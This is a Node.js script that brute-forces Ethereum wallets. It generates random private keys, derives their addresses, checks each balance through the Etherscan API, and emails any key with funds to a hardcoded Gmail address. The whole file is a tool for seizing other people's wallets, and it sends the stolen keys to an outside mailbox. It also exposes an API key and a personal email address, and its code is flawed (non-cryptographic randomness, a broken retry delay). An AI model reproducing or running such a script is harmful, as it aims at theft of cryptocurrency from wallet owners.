#!/usr/bin/env node
const CryptoJS = require('crypto-js');
const http = require('http');
const EC = require('elliptic').ec;
const ec = new EC('secp256k1');
var counter = 0;

'use strict';
const nodemailer = require('nodemailer');
const atob = require('atob');
const username = "EMAIL";
const password = "PASSWORD";
// create reusable transporter object using the default SMTP transport
var transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true, // secure:true for port 465, secure:false for port 587
    auth: {user: username, pass: password}
});

stallWorkFlow = function (){
  console.log("*** connection error ***")
  setTimeout(startWorkFlow(), 5000);
}

handleSuccessfulWorkFlow = function (privateKey, address, results){
  // setup email data with unicode symbols
  var message = "Success on attempt number: " + counter + "\n";
  message = message + "Private Key: " + privateKey + "\n";
  message = message + "Address: " + address + "\n";
  message = message + "Results: " + JSON.stringify(results) + "\n";

  var mailOptions = {
    from: '"EMAIL>', // sender address
    to: 'dhanani94@gmail.com', // list of receivers
    subject: 'Hello ETH Wallet ;)', // Subject line
    text: message // plain text body
  };

  // send mail with defined transport object
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
    }
    console.log('Message %s sent: %s', info.messageId, info.response);
    startWorkFlow();
  });
};

continueWorkFlow = function (privateKey, address, results){
  if (results["result"] == "0") {
  	counter++;
  	console.log("fuck.");
  	startWorkFlow()
  } else {
    handleSuccessfulWorkFlow(privateKey, address, results);
  }
}

checkBalance = function (privateKey, address) {
  console.log()
  console.log("(" + counter + "): " + address);
	var url = "http://api.etherscan.io/api?module=account&apikey=NBI9SGSW6P1NZQGYT8BD8DDN5UQ7AIM4E9&action=balance&tag=latest&address=" + address;
  http.get(url, function(response) {
    var body = '';
    response.on('data', function(d) {
      body += d;
    });
    response.on('end', function() {
      continueWorkFlow(privateKey, address, JSON.parse(body));
    });
  });
};


generateRandomPrivateKey = function (){
	privateKey = "";
	for (i = 0; i < 64; i++){
		var x = Math.floor((Math.random() * 16) + 0);
	  privateKey = privateKey + x.toString(16);
	};
	return privateKey
};

computeAddressFromPrivKey = function (privKey) {
  var keyPair = ec.genKeyPair();
  keyPair._importPrivate(privKey, 'hex');
  var compact = false;
  var pubKey = keyPair.getPublic(compact, 'hex').slice(2);
  var pubKeyWordArray = CryptoJS.enc.Hex.parse(pubKey);
  var hash = CryptoJS.SHA3(pubKeyWordArray, { outputLength: 256 });
  var address = hash.toString(CryptoJS.enc.Hex).slice(24);
  return "0x" + address;
};

startWorkFlow = function(){
  try {
  	privateKey = generateRandomPrivateKey();
  	address = computeAddressFromPrivKey(privateKey);
  	balance = checkBalance(privateKey, address);
  } catch(err) {
    stallWorkFlow();
  }
};

startWorkFlow()

process.on('uncaughtException', function (err) {
  console.error(err);
  stallWorkFlow();
});